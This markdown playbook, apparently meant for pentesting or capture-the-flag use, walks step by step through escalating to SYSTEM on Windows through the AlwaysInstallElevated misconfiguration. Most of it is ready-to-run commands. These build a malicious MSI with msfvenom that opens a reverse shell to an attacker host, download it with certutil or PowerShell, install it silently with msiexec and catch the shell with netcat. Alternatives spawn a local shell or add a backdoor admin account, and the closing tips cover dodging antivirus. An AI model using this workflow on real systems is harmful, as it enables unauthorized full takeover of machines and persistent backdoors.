# Windows Privilege Escalation – AlwaysInstallElevated

## Purpose

This file provides a structured workflow for identifying and exploiting the AlwaysInstallElevated misconfiguration for privilege escalation.

Core rules:
- Requires BOTH registry keys enabled
- Allows MSI files to run with SYSTEM privileges
- Results in instant SYSTEM shell
- No exploit required

---

## 0. Mental Model

If AlwaysInstallElevated is enabled:
→ Any MSI you run executes as SYSTEM

You control the MSI:
→ You control SYSTEM execution

---

## 1. Check Registry Keys (CRITICAL FIRST STEP)

cmd:

reg query HKLM\Software\Policies\Microsoft\Windows\Installer

reg query HKCU\Software\Policies\Microsoft\Windows\Installer

---

## 2. Confirm Setting Enabled

Look for:

AlwaysInstallElevated    REG_DWORD    0x1

BOTH must be set:
- HKLM = 1
- HKCU = 1

If only one is set:
→ NOT exploitable

---

## 3. Generate Malicious MSI (ATTACKER MACHINE)

Using msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o payload.msi

---

## 4. Transfer MSI to Target

Options:

certutil -urlcache -f http://<IP>/payload.msi payload.msi

powershell:

Invoke-WebRequest http://<IP>/payload.msi -OutFile payload.msi

---

## 5. Execute MSI

cmd:

msiexec /quiet /qn /i payload.msi

---

## 6. Catch Shell

Start listener:

nc -lvnp <PORT>

---

## 7. Verify SYSTEM Access

whoami

Expected:

nt authority\system

---

## 8. Alternative: Local Payload (No Reverse Shell)

If outbound blocked:

Generate MSI that spawns cmd:

msfvenom -p windows/x64/exec CMD="cmd.exe" -f msi -o shell.msi

---

## 9. Alternative: Add Local Admin User

Create MSI payload that runs:

net user hacker Password123! /add
net localgroup administrators hacker /add

---

## 10. Common Failure Points

- Only one registry key set
- wrong architecture payload
- AV deletes MSI
- outbound traffic blocked

---

## 11. If Stuck

- re-check BOTH registry keys
- regenerate payload
- try different payload type
- switch to bind shell or local user

---

## 12. Quick Exploit Pattern

1. Check registry keys
2. Confirm BOTH enabled
3. Generate MSI payload
4. Transfer to target
5. Execute with msiexec
6. Get SYSTEM shell

---

## 13. Mental Model

Registry misconfig = privilege grant  
MSI execution = SYSTEM  
Payload = control  

---

## 14. Golden Rules

- BOTH keys must be set
- Always use quiet install flags
- Keep payload simple if AV present
- This is an instant win—execute immediately